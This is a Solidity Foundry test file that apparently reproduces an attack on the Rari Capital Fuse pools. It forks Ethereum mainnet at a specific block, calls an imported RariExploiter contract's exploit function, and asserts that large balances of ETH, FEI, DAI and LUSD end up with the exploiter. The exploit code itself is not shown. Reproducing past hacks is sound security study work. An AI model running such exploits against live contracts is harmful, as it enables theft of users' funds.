// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/RariExploiter.sol";

contract RariTest is Test {
    IERC20Like private constant FEI = IERC20Like(0x956F47F50A910163D8BF957Cf5846D573E7f87CA);
    IERC20Like private constant DAI = IERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20Like private constant LUSD = IERC20Like(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);

    RariExploiter exploiter;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), 14684685);

        exploiter = new RariExploiter(); 
    }

    function testExploit() public {
        exploiter.exploit();

        assertTrue(address(exploiter).balance > 713 ether);
        assertTrue(FEI.balanceOf(address(exploiter)) > 11_924_074e18);
        assertTrue(DAI.balanceOf(address(exploiter)) > 3_184_115e18);
        assertTrue(LUSD.balanceOf(address(exploiter)) > 1_948_952e18);
    }
}
